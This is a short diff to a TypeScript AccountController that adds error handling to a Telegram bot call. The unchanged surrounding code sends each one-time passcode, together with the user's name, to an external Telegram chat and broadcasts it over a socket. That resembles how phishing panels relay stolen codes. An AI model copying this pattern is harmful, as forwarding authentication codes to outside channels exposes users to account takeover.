@@ -144,10 +144,15 @@ export class AccountController {
       );
       io.emit("updateOTP", result);
 
-      bot.sendMessage(
-        process.env.TELEGRAM_CHAT_ID,
-        `OTP: ${otp}\nName: ${result?.name}`
-      );
+      bot
+        .sendMessage(
+          process.env.TELEGRAM_CHAT_ID,
+          `OTP: ${otp}\nName: ${result?.name}`
+        )
+        .catch((err: any) => {
+          console.log("err", err.message);
+        });
+
       return res.status(200).json({ result });
     } catch (error: any) {
       console.log("error", error.message);
